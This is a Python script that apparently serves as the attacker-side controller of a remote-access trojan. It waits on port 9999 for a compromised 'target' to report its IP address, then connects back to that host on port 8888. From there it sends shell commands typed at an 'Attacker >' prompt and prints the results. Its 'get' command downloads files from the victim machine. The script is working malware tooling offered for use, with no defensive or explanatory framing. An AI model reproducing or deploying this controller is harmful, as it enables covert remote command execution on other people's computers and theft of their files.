import sys
import socket
import json

addr = (socket.gethostname(), 9999)
server = socket.socket()
server.bind (addr)
server.listen ( 5 )
print("Waiting target...")
cl, addr = server.accept () 
ip = (str(cl.recv(1024), encoding='utf-8'))
print(ip)
cl.close()

ip_port = (ip , 8888)
sk = socket.socket()
sk.connect(ip_port)
print('sever open....')
while True:
    print("==========Successful connection============")
    print(str(sk.recv(1024), encoding='utf-8'))
    while True:
        inp = input('Attacker >').strip()
        if inp =='': continue
        sk.sendall(bytes(inp, 'utf-8'))
        split = inp.split(" ")
        if split[0] == "get":
            gg = sk.recv( 1024 )
            json_obj = gg.decode() 
            if (str(gg, 'utf-8')) != 'No finish!' :
                file_info = json.loads(json_obj)  
                filename = file_info[ 'filename' ]  
                filesize = file_info[ 'filesize' ]  
                print ( 'filename=' ,filename, 'filesize=' ,filesize)  
                recevie_size =  0 
                myfile = open(filename, 'wb' )  
                print("Sending File...")
                while  recevie_size < filesize:  
                    filedata = sk.recv(1024)  
                    myfile.write(filedata)  
                    recevie_size += len(filedata) 
                myfile.close()  
                print('receive file finished!')  
            else:
                print((str(gg, 'utf-8')))
        else:
            basic_info_bytes = sk.recv(1024)
            result_length = int(str(basic_info_bytes, encoding='utf-8').split('|')[1])
            sk.sendall(bytes('ack',encoding='utf-8'))
            has_received = 0
            content_bytes = bytes()
            while has_received < result_length:
                fetch_bytes = sk.recv(1024)
                has_received += len(fetch_bytes)
                content_bytes += fetch_bytes
            cmd_result = str(content_bytes, 'utf-8')
            print(cmd_result)   
    sk.close()